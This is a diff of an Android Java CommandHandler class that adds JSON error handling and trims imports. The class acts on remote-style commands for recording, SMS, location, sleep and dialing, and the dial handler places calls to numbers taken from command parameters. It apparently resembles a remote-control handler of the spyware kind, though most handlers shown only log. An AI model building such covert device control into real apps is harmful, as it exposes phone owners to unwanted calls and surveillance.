@@ -4,12 +4,9 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.content.pm.PackageInfo;
-import android.media.MediaRecorder;
-import android.net.ConnectivityManager;
-import android.net.NetworkInfo;
-import android.provider.MediaStore;
-import android.telephony.TelephonyManager;
+import android.net.Uri;
 import android.util.Log;
+import org.json.JSONException;
 import org.json.JSONObject;
 
 public class CommandHandler {
@@ -77,8 +74,12 @@ public class CommandHandler {
             Log.d(TAG, "Recording params required");
             return;
         }
-        int duration = params.getInt("duration");
-        Log.d(TAG, "Recording started for " + duration + " seconds");
+        try {
+            int duration = params.getInt("duration");
+            Log.d(TAG, "Recording started for " + duration + " seconds");
+        } catch (JSONException e) {
+            Log.e(TAG, "Failed to parse recording params", e);
+        }
     }
 
     private void sendSMS(JSONObject params) {
@@ -86,9 +87,13 @@ public class CommandHandler {
             Log.d(TAG, "SMS params required");
             return;
         }
-        String phone = params.getString("phone");
-        String message = params.getString("message");
-        Log.d(TAG, "SMS sent to: " + phone);
+        try {
+            String phone = params.getString("phone");
+            String message = params.getString("message");
+            Log.d(TAG, "SMS sent to: " + phone);
+        } catch (JSONException e) {
+            Log.e(TAG, "Failed to parse SMS params", e);
+        }
     }
 
     private void getLocation() {
@@ -125,9 +130,13 @@ public class CommandHandler {
             Log.d(TAG, "Dial params required");
             return;
         }
-        String phone = params.getString("phone");
-        Intent intent = new Intent(Intent.ACTION_CALL, android.net.Uri.parse("tel:" + phone));
-        context.startActivity(intent);
+        try {
+            String phone = params.getString("phone");
+            Intent intent = new Intent(Intent.ACTION_CALL, Uri.parse("tel:" + phone));
+            context.startActivity(intent);
+        } catch (JSONException e) {
+            Log.e(TAG, "Failed to parse dial params", e);
+        }
     }
 
     private void sleep(JSONObject params) {
@@ -135,8 +144,12 @@ public class CommandHandler {
             Log.d(TAG, "Sleep params required");
             return;
         }
-        long duration = params.getLong("duration");
-        Log.d(TAG, "Sleep mode for " + duration + " seconds");
+        try {
+            long duration = params.getLong("duration");
+            Log.d(TAG, "Sleep mode for " + duration + " seconds");
+        } catch (JSONException e) {
+            Log.e(TAG, "Failed to parse sleep params", e);
+        }
     }
 
     private void wake() {
